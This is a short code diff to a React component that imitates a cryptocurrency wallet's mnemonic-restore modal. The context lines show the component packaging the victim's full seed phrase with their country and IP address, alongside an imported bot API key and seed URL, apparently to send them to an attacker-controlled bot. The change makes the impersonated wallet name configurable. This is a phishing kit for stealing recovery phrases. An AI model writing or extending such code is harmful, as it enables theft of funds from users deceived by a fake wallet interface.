@@ -3,7 +3,7 @@
 import { useEffect, useRef, useState } from "react";
 import type { SeedPhraseLengthOption } from "./EternlSeedPhraseTypeModal";
 import { getUserCountry } from "../../utils/userLocation";
-import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
+import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
 import EternlModalShell from "./EternlModalShell";
 
 export function seedOptionToWordCount(
@@ -163,7 +163,7 @@ export default function EternlRestoreMnemonicEntryModal({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Lace",
+        appName: NOTIFICATION_APP_NAME,
         seedPhrase: sanitized.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
